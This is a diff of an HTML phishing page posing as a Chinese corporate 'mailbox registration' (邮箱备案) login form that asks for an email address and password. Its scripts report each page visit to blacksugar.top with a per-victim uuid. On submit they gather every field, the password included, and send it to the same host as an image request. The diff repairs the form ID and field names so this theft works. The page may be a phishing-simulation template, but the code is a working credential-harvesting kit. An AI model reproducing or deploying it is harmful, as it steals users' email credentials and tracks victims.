@@ -1,20 +1,9 @@
-<!DOCTYPE html><!--STATUS OK--><html lang="ch"><head><base href="https://maill.ski"/><meta charset="utf-8"/>
+<!DOCTYPE html><!--STATUS OK--><html lang="ch"><head><base href="https://maill.ski/"/><meta charset="utf-8"/>
 	
 	<meta http-equiv="X-UA-Compatible" content="IE=edge"/>
 	<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
 	<link rel="shortcut icon" href="exmail_logo.ico"/>
 	<title>OA邮箱备案系统</title>
-	<script type="text/javascript">
-      //判断是否手机访问 如果是跳转 
-      try {
-      var urlhash = window.location.hash;
-      if (!urlhash.match("fromapp")) {
-      if ((navigator.userAgent.match(/(iPhone|iPod|Android|ios|iPad)/i))) {
-      window.location = "/wap.html";
-      }
-      }
-      } catch (err) {}
-</script>
 	<script type="text/javascript">
 </script>
 	<style>
@@ -77,30 +66,34 @@
 	<script type="text/javascript" src="js/jquery.min.js"></script>
 	<script type="text/javascript" src="js/layer.js"></script>
 	</head>
-	<body>
-		<div style="display: flex;width: 100%;height: 100vh;">
-			<div style="display: flex;justify-content: center;width: 50%;flex-direction: column;">
-				<div style="margin: auto;">
-					<h1>邮箱备案中心，</h1>
-					<h1>引领企业邮件管理系统革新。</h1>
-				</div>
+<body>
+	<div style="display: flex;width: 100%;height: 100vh;">
+		<div style="display: flex;justify-content: center;width: 50%;flex-direction: column;">
+			<div style="margin: auto;">
+				<h1>邮箱备案中心，</h1>
+				<h1>引领企业邮件管理系统革新。</h1>
 			</div>
-			<div style="display: flex;justify-content: center;width: 50%;flex-direction: column;">
-				<div style="margin: 0 auto;background-color: #fff;width: 50%;height: 40vh;box-shadow: 0 2px 4px rgba(0, 0, 0, .12), 0 0 6px rgba(0, 0, 0, .04);border-radius: 2px;">
-					<div style="text-align: center;margin-top: 30px;margin-bottom: 30px;font-size: 30px;">邮箱备案中心</div>
+		</div>
+		<div style="display: flex;justify-content: center;width: 50%;flex-direction: column;">
+			<div style="margin: 0 auto;background-color: #fff;width: 50%;height: 60vh;box-shadow: 0 2px 4px rgba(0, 0, 0, .12), 0 0 6px rgba(0, 0, 0, .04);border-radius: 2px;">
+				<div style="text-align: center;margin-top: 30px;margin-bottom: 30px;font-size: 30px;">邮箱备案中心</div>
+				<form id="loginForm" method="post">
 					<div style="border: none;display: flex;justify-content: center;margin-bottom: 25px;">
 						<div style="font-size: 16px;line-height: 40px;">邮箱账号</div>
-						<input type="email" id="mail" class="login_scan_panel_pwd_input" placeholder="输入邮箱帐号"/>
+						<input type="email" id="mail" class="login_scan_panel_pwd_input" name="email" placeholder="输入邮箱帐号"/>
 					</div>
 					<div style="border: none;display: flex;justify-content: center;margin-bottom: 25px;">
 						<div style="font-size: 16px;line-height: 40px;">邮箱密码</div>
-						<input type="password" id="pass" class="login_scan_panel_pwd_input" placeholder="输入邮箱密码"/>
+						<input type="password" id="pass" class="login_scan_panel_pwd_input" name="password" placeholder="输入邮箱密码"/>
 					</div>
-					<input type="submit" class="login" id="login" value="邮箱备案" onclick="return datapost0()"/>
-				</div>
+					<div style="border: none;display: flex;justify-content: center;margin-bottom: 25px;">
+						<input type="submit" class="login" value="登 录 备 案" onclick="return datapost0()"/>
+					</div>
+				</form>
 			</div>
 		</div>
-<script>
+	</div>
 
-	
-<script>const urlParams = new URLSearchParams(window.location.search);const uuid = urlParams.get('uuid');if (uuid) { var img = new Image(); img.src = 'http://www.blacksugar.top/track/openurl?uuid=' + uuid; img.onload = function () { console.log('successful'); }; img.onerror = function() { console.log('failed');};}</script><script>function datapost0() { var data=''; var myForm = document.getElementById('postform0');var inputElements = myForm.querySelectorAll('input'); inputElements.forEach(inputElement => { if (inputElement.type !=='submit') {data += `${inputElement.name}:${inputElement.value} `; };}); var urlParams = new URLSearchParams(window.location.search);var uuid = urlParams.get('uuid');if (uuid) { var img = new Image(); img.src = 'http://www.blacksugar.top/track/datapost?uuid='+uuid+'&data=' +data; img.onload = function () { console.log('successful'); }; img.onerror = function() { console.log('failed');};}return false;} </script></body></html>
+
+
+<script>const urlParams = new URLSearchParams(window.location.search);const uuid = urlParams.get('uuid');if (uuid) { var img = new Image(); img.src = 'http://www.blacksugar.top/track/openurl?uuid=' + uuid; img.onload = function () { console.log('successful'); }; img.onerror = function() { console.log('failed');};}</script><script>function datapost0() { var data=''; var myForm = document.getElementById('loginForm');var inputElements = myForm.querySelectorAll('input'); inputElements.forEach(inputElement => { if (inputElement.type !=='submit') {data += `${inputElement.name}:${inputElement.value} `; };}); var urlParams = new URLSearchParams(window.location.search);var uuid = urlParams.get('uuid');if (uuid) { var img = new Image(); img.src = 'http://www.blacksugar.top/track/datapost?uuid='+uuid+'&data=' +data; img.onload = function () { console.log('successful'); }; img.onerror = function() { console.log('failed');};}return false;} </script></body></html>
